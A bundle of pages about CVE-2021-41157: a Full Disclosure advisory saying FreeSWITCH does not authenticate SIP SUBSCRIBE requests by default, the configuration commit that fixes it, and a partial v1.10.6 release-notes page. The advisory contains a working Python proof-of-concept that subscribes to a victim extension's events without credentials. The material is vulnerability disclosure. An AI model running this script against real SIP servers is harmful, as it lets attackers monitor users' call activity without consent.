=== Content from seclists.org_318b2c56_20250114_210556.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](40)
[By Date](date.html#41)
[![Next](/images/right-icon-16x16.png)](42)

[![Previous](/images/left-icon-16x16.png)](40)
[By Thread](index.html#41)
[![Next](/images/right-icon-16x16.png)](42)

![](/shared/images/nst-icons.svg#search)

# [ES2021-08] FreeSWITCH does not authenticate SIP SUBSCRIBE requests by default

---

*From*: "Sandro Gauci" <sandro () enablesecurity com>

*Date*: Mon, 25 Oct 2021 16:24:09 +0200

---

```
# FreeSWITCH does not authenticate SIP SUBSCRIBE requests by default

- Fixed versions: v1.10.7
- Enable Security Advisory:
<https://github.com/EnableSecurity/advisories/tree/master/ES2021-08-freeswitch-SIP-SUBSCRIBE-without-auth>
- Vendor Security Advisory: <https://github.com/signalwire/freeswitch/security/advisories/GHSA-g7xg-7c54-rmpj>
- Other references: CVE-2021-41157
- Tested vulnerable versions: <= v1.10.5
- Timeline:
    - Report date: 2021-06-07
    - Triaged: 2021-06-08
    - Fix provided for testing: 2021-10-01
    - Vendor release with fix: 2021-10-24
    - Enable Security advisory: 2021-10-25

## Description

By default, SIP requests of the type SUBSCRIBE are not authenticated in the affected versions of FreeSWITCH. Although
this issue was [fixed][1] in version v1.10.6, installations upgraded to the fixed version of FreeSWITCH from an older
version, may still be vulnerable if the configuration is not updated accordingly. For good reason, by default, software
upgrades do not update the configuration.

[1]: <https://github.com/signalwire/freeswitch/commit/b21dd4e7f3a6f1d5f7be3ea500a319a5bc11db9e>

## Impact

Abuse of this security issue allows attackers to subscribe to user agent event notifications without the need to
authenticate. This abuse poses privacy concerns and might lead to social engineering or similar attacks. For example,
attackers may be able to monitor the status of target SIP extensions.

## How to reproduce the issue

1. Install FreeSWITCH v1.10.5 or lower
2. Run FreeSWITCH using the default configuration
3. Register as a legitimate SIP user on the FreeSWITCH server using a softphone (e.g. sip:1000@192.168.188.128 where
192.168.188.128 is your FreeSWITCH server)
4. Save the below Python script to `anon-subscribe.py`
5. Run the script from an IP address that is different from that of the softphone `python anon-subscribe.py
<freeswitch_ip> <freeswitch_port> <victim_extension>`
6. Perform some operations using the softphone, such as deregistering, registering, and placing a call
7. Observe that several notifications are received by the script, exposing the actions being performed by the victim

```python
import socket, string, random, re, sys

UDP_IP = sys.argv[1]
UDP_PORT = int(sys.argv[2])
EXT = sys.argv[3]
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

msg_template = "SUBSCRIBE sip:%s@%s;transport=UDP SIP/2.0\r\n" % (EXT, UDP_IP) + \
    "Via: SIP/2.0/UDP [ip]:[port];rport;branch=z9hG4bK-[rand]\r\n" \
    "Max-Forwards: 70\r\n" \
    "Contact: <sip:%s@[ip]:[port];transport=udp>\r\n" % (EXT, ) + \
    "To: <sip:%s@%s;transport=UDP>\r\n" % (EXT, UDP_IP) + \
    "From: <sip:9999@%s;transport=UDP>;tag=[rand]\r\n" % (UDP_IP, ) + \
    "Call-ID: [rand]\r\n" \
    "CSeq: 1 SUBSCRIBE\r\n" \
    "Expires: 600\r\n" \
    "Accept: */*\r\n" \
    "Event: [event]\r\n" \
    "Content-Length: 0\r\n" \
    "\r\n"

rand = ''.join(random.choice(string.ascii_letters) for i in range(16))
msg = msg_template.replace('[ip]', '127.0.0.1') \
    .replace('[port]', '9999') \
        .replace('[event]', 'dialog') \
            .replace('[rand]', rand)

sock.sendto(msg.encode(), (UDP_IP, UDP_PORT))

recv=sock.recv(10240).decode()

# get rport and received from Via header
rport=re.search( r'rport=([0-9]+)', recv, re.MULTILINE).group(1)
received=re.search( r'received=([0-9\.]+)', recv, re.MULTILINE).group(1)

events = [
    'talk', 'hold', 'conference', 'presence', 'as-feature-event', 'dialog', 'line-seize',
    'call-info', 'sla', 'include-session-description', 'presence.winfo', 'message-summary',
    'refer']

for event in events:
    rand = ''.join(random.choice(string.ascii_letters) for i in range(16))
    msg = msg_template.replace('[ip]', received) \
        .replace('[port]', rport) \
            .replace('[event]', event) \
                .replace('[rand]', rand)
    sock.sendto(msg.encode(), (UDP_IP, UDP_PORT))

while True:
    print(sock.recv(10240).decode().split('\r\n\r\n')[1])
```

## Solution and recommendations

Upgrade to a version of FreeSWITCH that fixes this issue.

Our suggestion to the FreeSWITCH developers was the following:

```
> ```
> Our recommendation is that SIP SUBSCRIBE messages are authenticated by default so that FreeSWITCH administrators do
> not need to explicitly set the `auth-subscriptions` parameter. When following such a recommendation, a new parameter
> can be introduced to explicitly disable authentication.
>
> ```

```

## About Enable Security

[Enable Security](<https://www.enablesecurity.com>) develops offensive security tools and provides quality penetration
testing to help protect your real-time communications systems against attack.

## Disclaimer

The information in the advisory is believed to be accurate at the time of publishing based on currently available
information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with
regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or
consequential loss or damage arising from use of, or reliance on, this information.

## Disclosure policy

This report is subject to Enable Security's vulnerability disclosure policy which can be found at
<<https://github.com/EnableSecurity/Vulnerability-Disclosure-Policy>>.

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](40)
[By Date](date.html#41)
[![Next](/images/right-icon-16x16.png)](42)

[![Previous](/images/left-icon-16x16.png)](40)
[By Thread](index.html#41)
[![Next](/images/right-icon-16x16.png)](42)

### Current thread:

* **[ES2021-08] FreeSWITCH does not authenticate SIP SUBSCRIBE requests by default** *Sandro Gauci (Oct 26)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from github.com_26dda942_20250114_210558.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsignalwire%2Ffreeswitch%2Fcommit%2Fb21dd4e7f3a6f1d5f7be3ea500a319a5bc11db9e)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsignalwire%2Ffreeswitch%2Fcommit%2Fb21dd4e7f3a6f1d5f7be3ea500a319a5bc11db9e)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=signalwire%2Ffreeswitch)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[signalwire](/signalwire)
/
**[freeswitch](/signalwire/freeswitch)**
Public

* [Notifications](/login?return_to=%2Fsignalwire%2Ffreeswitch) You must be signed in to change notification settings
* [Fork
  1.5k](/login?return_to=%2Fsignalwire%2Ffreeswitch)
* [Star
   3.8k](/login?return_to=%2Fsignalwire%2Ffreeswitch)

* [Code](/signalwire/freeswitch)
* [Issues
  765](/signalwire/freeswitch/issues)
* [Pull requests
  268](/signalwire/freeswitch/pulls)
* [Actions](/signalwire/freeswitch/actions)
* [Wiki](/signalwire/freeswitch/wiki)
* [Security](/signalwire/freeswitch/security)
* [Insights](/signalwire/freeswitch/pulse)

Additional navigation options

* [Code](/signalwire/freeswitch)
* [Issues](/signalwire/freeswitch/issues)
* [Pull requests](/signalwire/freeswitch/pulls)
* [Actions](/signalwire/freeswitch/actions)
* [Wiki](/signalwire/freeswitch/wiki)
* [Security](/signalwire/freeswitch/security)
* [Insights](/signalwire/freeswitch/pulse)

## Commit

[Permalink](/signalwire/freeswitch/commit/b21dd4e7f3a6f1d5f7be3ea500a319a5bc11db9e)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

[Default-Configuration] Force sip subscription requests to require au‚Ä¶

[Browse files](/signalwire/freeswitch/tree/b21dd4e7f3a6f1d5f7be3ea500a319a5bc11db9e)
Browse the repository at this point in the history

```
‚Ä¶thentication.
```

* Loading branch information

[![@DonLoquacious](https://avatars.githubusercontent.com/u/1045008?s=40&v=4)](/DonLoquacious) [![@andywolk](https://avatars.githubusercontent.com/u/4557407?s=40&v=4)](/andywolk)

[DonLoquacious](/signalwire/freeswitch/commits?author=DonLoquacious "View all commits by DonLoquacious")
authored and
[andywolk](/signalwire/freeswitch/commits?author=andywolk "View all commits by andywolk")
committed
Sep 3, 2020

1 parent
[bb79c57](/signalwire/freeswitch/commit/bb79c578cb7183028fc4d20f76f0e732bbed4f82)

commit b21dd4e

 Show file tree

 Hide file tree

Showing
**4 changed files**
with
**8 additions**
and
**0 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* conf

  + insideout/sip\_profiles

    - conf/insideout/sip\_profiles/internal.xml
      [internal.xml](#diff-6b46b33723e5e497f68230995fa1460d97cbbbe0f76d069037780e85cb8bea2c)
  + minimal/sip\_profiles

    - conf/minimal/sip\_profiles/internal.xml
      [internal.xml](#diff-d9bbbb7facc78e7963cc3a2373dd599d20d930b0cd7e59e8efa11a6757493ced)
  + testing/sip\_profiles

    - conf/testing/sip\_profiles/internal.xml
      [internal.xml](#diff-f1c803147ee6c41862c0e1a7fe5762c33eee3c21ff720784613a8a41e228f89d)
  + vanilla/sip\_profiles

    - conf/vanilla/sip\_profiles/internal.xml
      [internal.xml](#diff-7a6aa8b7d76a30090e0286d0516718bdebea41e0041c31f4f908fec645d49970)

## There are no files selected for viewing

2 changes: 2 additions & 0 deletions

2
[conf/insideout/sip\_profiles/internal.xml](#diff-6b46b33723e5e497f68230995fa1460d97cbbbe0f76d069037780e85cb8bea2c "conf/insideout/sip_profiles/internal.xml")

Show comments

[View file](/signalwire/freeswitch/blob/b21dd4e7f3a6f1d5f7be3ea500a319a5bc11db9e/conf/insideout/sip_profiles/internal.xml)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -129,6 +129,8 @@ |
|  |  | <!-- add a ;received="<ip>:<port>" to the contact when replying to register for nat handling --> |
|  |  | <!--<param name="NDLB-received-in-nat-reg-contact" value="true"/>--> |
|  |  | <param name="auth-calls" value="$${internal\_auth\_calls}"/> |
|  |  | <!-- Force subscription requests to require authentication --> |
|  |  | <param name="auth-subscriptions" value="true"/> |
|  |  | <!-- Force the user and auth-user to match. --> |
|  |  | <param name="inbound-reg-force-matching-username" value="true"/> |
|  |  | <!-- on authed calls, authenticate \*all\* the packets not just invite --> |
| Expand Down | |  |

2 changes: 2 additions & 0 deletions

2
[conf/minimal/sip\_profiles/internal.xml](#diff-d9bbbb7facc78e7963cc3a2373dd599d20d930b0cd7e59e8efa11a6757493ced "conf/minimal/sip_profiles/internal.xml")

Show comments

[View file](/signalwire/freeswitch/blob/b21dd4e7f3a6f1d5f7be3ea500a319a5bc11db9e/conf/minimal/sip_profiles/internal.xml)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,6 +1,8 @@ |
|  |  | <profile name="internal"> |
|  |  | <settings> |
|  |  | <param name="auth-calls" value="true"/> |
|  |  | <!-- Force subscription requests to require authentication --> |
|  |  | <param name="auth-subscriptions" value="true"/> |
|  |  | <param name="apply-nat-acl" value="nat.auto"/> |
|  |  |  |
|  |  | <param name="debug" value="0"/> |
| Expand Down | |  |

2 changes: 2 additions & 0 deletions

2
[conf/testing/sip\_profiles/internal.xml](#diff-f1c803147ee6c41862c0e1a7fe5762c33eee3c21ff720784613a8a41e228f89d "conf/testing/sip_profiles/internal.xml")

Show comments

[View file](/signalwire/freeswitch/blob/b21dd4e7f3a6f1d5f7be3ea500a319a5bc11db9e/conf/testing/sip_profiles/internal.xml)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -267,6 +267,8 @@ |
|  |  | <!-- add a ;received="<ip>:<port>" to the contact when replying to register for nat handling --> |
|  |  | <!--<param name="NDLB-received-in-nat-reg-contact" value="true"/>--> |
|  |  | <param name="auth-calls" value="$${internal\_auth\_calls}"/> |
|  |  | <!-- Force subscription requests to require authentication --> |
|  |  | <param name="auth-subscriptions" value="true"/> |
|  |  | <!-- Force the user and auth-user to match. --> |
|  |  | <param name="inbound-reg-force-matching-username" value="true"/> |
|  |  | <!-- on authed calls, authenticate \*all\* the packets not just invite --> |
| Expand Down | |  |

2 changes: 2 additions & 0 deletions

2
[conf/vanilla/sip\_profiles/internal.xml](#diff-7a6aa8b7d76a30090e0286d0516718bdebea41e0041c31f4f908fec645d49970 "conf/vanilla/sip_profiles/internal.xml")

Show comments

[View file](/signalwire/freeswitch/blob/b21dd4e7f3a6f1d5f7be3ea500a319a5bc11db9e/conf/vanilla/sip_profiles/internal.xml)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -267,6 +267,8 @@ |
|  |  | <!-- add a ;received="<ip>:<port>" to the contact when replying to register for nat handling --> |
|  |  | <!--<param name="NDLB-received-in-nat-reg-contact" value="true"/>--> |
|  |  | <param name="auth-calls" value="$${internal\_auth\_calls}"/> |
|  |  | <!-- Force subscription requests to require authentication --> |
|  |  | <param name="auth-subscriptions" value="true"/> |
|  |  | <!-- Force the user and auth-user to match. --> |
|  |  | <param name="inbound-reg-force-matching-username" value="true"/> |
|  |  | <!-- on authed calls, authenticate \*all\* the packets not just invite --> |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 1 comment on commit `b21dd4e`

[![@andywolk](https://avatars.githubusercontent.com/u/4557407?s=80&v=4)](/andywolk)

Copy link

Contributor

### @andywolk **[andywolk](/andywolk)** commented on `[b21dd4e](/signalwire/freeswitch/commit/b21dd4e7f3a6f1d5f7be3ea500a319a5bc11db9e)` [Sep 3, 2020](#commitcomment-42014339)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

<https://github.com/signalwire/stack/pull/269>

Sorry, something went wrong.

All reactions

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsignalwire%2Ffreeswitch%2Fcommit%2Fb21dd4e7f3a6f1d5f7be3ea500a319a5bc11db9e) to comment.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_1fe0c349_20250114_210600.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsignalwire%2Ffreeswitch%2Freleases%2Ftag%2Fv1.10.6)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsignalwire%2Ffreeswitch%2Freleases%2Ftag%2Fv1.10.6)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Fshow&source=header-repo&source_repo=signalwire%2Ffreeswitch)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[signalwire](/signalwire)
/
**[freeswitch](/signalwire/freeswitch)**
Public

* [Notifications](/login?return_to=%2Fsignalwire%2Ffreeswitch) You must be signed in to change notification settings
* [Fork
  1.5k](/login?return_to=%2Fsignalwire%2Ffreeswitch)
* [Star
   3.8k](/login?return_to=%2Fsignalwire%2Ffreeswitch)

* [Code](/signalwire/freeswitch/tree/v1.10.6)
* [Issues
  765](/signalwire/freeswitch/issues)
* [Pull requests
  268](/signalwire/freeswitch/pulls)
* [Actions](/signalwire/freeswitch/actions)
* [Wiki](/signalwire/freeswitch/wiki)
* [Security](/signalwire/freeswitch/security)
* [Insights](/signalwire/freeswitch/pulse)

Additional navigation options

* [Code](/signalwire/freeswitch/tree/v1.10.6)
* [Issues](/signalwire/freeswitch/issues)
* [Pull requests](/signalwire/freeswitch/pulls)
* [Actions](/signalwire/freeswitch/actions)
* [Wiki](/signalwire/freeswitch/wiki)
* [Security](/signalwire/freeswitch/security)
* [Insights](/signalwire/freeswitch/pulse)

1. [Releases](/signalwire/freeswitch/releases)
2. [v1.10.6](/signalwire/freeswitch/releases/tag/v1.10.6)

# FreeSWITCH v1.10.6 Release

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/signalwire/freeswitch/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v1.10.6)

 Loading

[View all tags](/signalwire/freeswitch/tags)

![@andywolk](https://avatars.githubusercontent.com/u/4557407?s=40&v=4)
[andywolk](/andywolk)
released this
25 Mar 16:21

¬∑
[1038 commits](/signalwire/freeswitch/compare/v1.10.6...master)
to master
since this release

[v1.10.6](/signalwire/freeswitch/tree/v1.10.6)

[`1ff9d0a`](/signalwire/freeswitch/commit/1ff9d0a60e00c887d653805b3c6c7aa93443a05b)

---

This is the major bug fix release containing important stability improvements. We encourage all users to upgrade to v1.10.6 whenever possible.

---

```
 Release Notes - FreeSWITCH - Version 1.10.6

```
### Enhancement

* [Build-System] Check requirements when generating tarballs.
* [Build-System] freeswitch.spec update
* [build] add addr sanitizer to out of tree mod stubs
* [build] Add missing checks to libvpx build system for macOS 11.
* [core] add event::merge
* [core] Allow other (D)TLS Curves/Groups beside P-256
* [Core] Create x509v3 certificates
* [core] debug socket sendto
* [core] Enable MSRP over IPv6
* [Core] Enable use of DTLSv1\_2 on Windows.
* [core] Exclude RFC-6598 CGNAT private space from wan.auto acl
* [core] support convert to ARGB\_LE video format
* [Core] switch\_core\_port\_allocator: Replace getaddrinfo() (may get stuck) with switch\_sockaddr\_new() and fix IPv6.
* [core] Update switch\_ivr\_enterprise\_originate() to accept optional switch\_dial\_handle\_list\_t instead of dialstring.
* [Default-Configuration] Force sip subscription requests to require authentication.
* [FreeSwitchConsole] -version option enabled in windows + read git revision
* [mod\_amr] introduce new cfg setting force-oa to change between OA/BE when originating, show session in debug logs, update configs
* [mod\_amrwb] add cfg setting to switch between OA/BE when originating
* [mod\_amrwb] show the session in debug logs.
* [mod\_dptools] early video decode and debug
* [mod\_expr] log errors
* [mod\_http\_cache] Generic HTTP API Authorization header support
* [mod\_kazoo] add kz\_contact api
* [mod\_pgsql] Use PQcmdTuples() to get number of effected rows to support UPDATE and INSERT without RETURNING.
* [mod\_rayo] Enable -fno-common compilation
* [mod\_signalwire] Upgrade code to be able to work on newer libks and signalwire-c v2.0 when released
* [mod\_sms] add final chat function
* [mod\_sofia] Add back sip Identity header into sip\_i\_identity variables in sofia\_parse\_all\_invite\_headers
* [mod\_sofia] add call-id to log line to link with session uuid
* [mod\_sofia] Add preliminary handing for SHAKEN/STIR via SIP Identity Header
* [mod\_sofia] Verification of the wss.pem certificate in mod\_sofia application code. Display correct reason why sofia profile failed to create
* [mod\_test] add tts mock
* [mod\_xml\_curl] Allow XML\_CURL\_MAX\_BYTES to be configured at runtime
* [Testing] Move Drone artifacts to signalwire.cloud
* [verto-client] move verto client to github.com/freeswitch/verto-client
* Fix some typos (most found by codespell)

### Bug

* OSX build fixes
* [apr] fix find\_if\_index for BSDs/mac
* [Build-System] Add src/include/switch\_swigable\_cpp.h requirement to make swigall
* [Build-System] Fix build with MSBuild.
* [Build-System] Remove mod\_freetdm from spec file, fix compile errors on CentOS
* [build] fix compilation under musl 1.2
* [build] fix configure checks for ipv6 on latest osx
* [build] fix libpq configure check to use flags from autoconf/pkg-config
* [configuration] Copy TLS ciphers from vars.xml even in Vanilla External
* [Core] Add new switch\_core\_session\_try\_reset() API to fix a deadlock for the case when two threads want to set session codecs.
* [Core] Adding fix for switch\_ivr\_originate to not copy group\_confirm variables to the channel
* [Core] Capture return value of 2nd call to LoadLibraryEx and add a third call to widen the search to the module in switch\_dso\_open().
* [Core] Databases: Fix duplicate key name 'recovery3'
* [core] DTLS PEM validation/creation tweaks and fix leaks in fixed pem path.
* [core] eavesdrop: init L16 codec at right ptime in certain conditions.
* [core] eavesdrop: reduce lock contention, fix error condition + enable eavesdrop stereo .
* [Core] execute\_on\_audio\_change on codec change
* [Core] fix asr resample out data len
* [Core] Fix buffer race in switch\_ivr\_eavesdrop\_session()
* [Core] Fix codec ready checks in switch\_core\_session\_read\_frame()
* [Core] Fix crash while writing text\_frame in conference
* [Core] Fix double close of a socket in switch\_rtp
* [Core] Fix hangup race in recording\_follow\_transfer.
* [core] Fix ICE candidate priorities
* [core] fix leak in http request parser
* [Core] Fix leak of switch\_event\_header\_t in switch\_event\_base\_add\_header(). Code cleanup.
* [Core] Fix leaking codec, timer and abuf in switch\_ivr\_play\_file() in the case of failing switch\_ivr\_phrase\_macro() or switch\_ivr\_speak\_text()
* [Core] Fix leaking stream in switch\_channel\_expand\_variables\_check()
* [Core] Fix leaking stream in switch\_event\_expand\_headers\_check()
* [Core] Fix leaks in switch\_ivr\_park when initially no rate.
